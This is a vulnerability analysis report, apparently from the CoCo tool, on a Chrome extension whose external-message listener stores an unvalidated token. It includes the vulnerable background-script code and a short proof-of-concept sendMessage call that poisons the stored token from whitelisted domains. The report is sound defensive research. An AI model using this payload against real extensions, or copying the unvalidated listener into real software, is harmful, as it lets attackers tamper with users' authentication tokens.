# CoCo Analysis: fmnbhafoldgblmdmhflflnjlfjcgpnog

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fmnbhafoldgblmdmhflflnjlfjcgpnog/opgen_generated_files/bg.js
Line 1089: `request.token`

**Code:**

```javascript
// Background script (bg.js, line 1087) - Entry point
chrome.runtime.onMessageExternal.addListener(
    (request, sender, sendResponse) => {
        if (request.token !== undefined) {
            // Storage write sink - attacker controls the token value
            chrome.storage.local.set({token: request.token}) // ← attacker-controlled
        }

        if (request.checkIfExtensionIsInstalled !== undefined) {
            sendResponse(true);
        }

        if (request.checkIfExtensionIsPinned !== undefined) {
            chrome.action.getUserSettings().then(userSettings => {
                sendResponse(userSettings.isOnToolbar);
            });
        }

        return true
    }
)
```

**Manifest Permissions:**
- `storage` permission: ✓ Present
- `externally_connectable`: Restricts to localhost:8001 and notix.so domains (per methodology, we IGNORE this restriction)

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.sendMessage from whitelisted domains (notix.so or localhost:8001)

**Attack:**

```javascript
// On https://notix.so/* (whitelisted domain in manifest.json)
// Or from localhost:8001 during development
chrome.runtime.sendMessage(
    "fmnbhafoldgblmdmhflflnjlfjcgpnog", // Extension ID
    { token: "attacker-controlled-fake-token" },
    (response) => {
        console.log("Token poisoned successfully");
    }
);

// Alternative: If attacker compromises notix.so domain or runs malicious code on localhost
// they can inject arbitrary token values into the extension's storage
```

**Impact:** Storage poisoning vulnerability. An attacker from whitelisted domains (notix.so or localhost:8001) can inject malicious authentication tokens into the extension's storage. Even though access is restricted to specific domains, this still represents a vulnerability since the extension trusts any message from these domains without validation. If the notix.so domain is compromised or if an attacker can execute JavaScript on that domain (via XSS), they can poison the extension's authentication token.
